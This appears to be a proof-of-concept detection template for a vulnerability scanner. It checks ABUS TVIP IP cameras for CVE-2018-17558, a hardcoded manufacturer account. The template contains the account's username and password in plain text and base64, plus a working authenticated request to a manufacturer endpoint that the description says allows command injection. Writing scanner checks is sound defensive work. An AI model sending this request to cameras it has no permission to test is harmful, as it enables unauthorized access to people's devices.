[info]
id = "POC-AVE-2018-0011"
name = "ABUS TVIP系列摄像头硬编码凭证检测 PoC"
author = "AVE"
severity = "critical"
tags = ["hardcoded-credentials", "cve-2018-17558", "abus"]
description = "检测ABUS TVIP系列IP摄像头是否存在硬编码制造商账户(manufacture/erutcafunam)，该账户可通过/cgi-bin/mft/wireless_mft接口实现命令注入"
vuln_id = ["CVE-2018-17558", "AVE-2018-0011"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/mft/wireless_mft"
headers.Authorization = "Basic bWFudWZhY3R1cmU6ZXJ1dGNhZnVuYW0="
headers.Connection = "close"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["wireless", "config", "WLAN", "SSID"]
expect = true
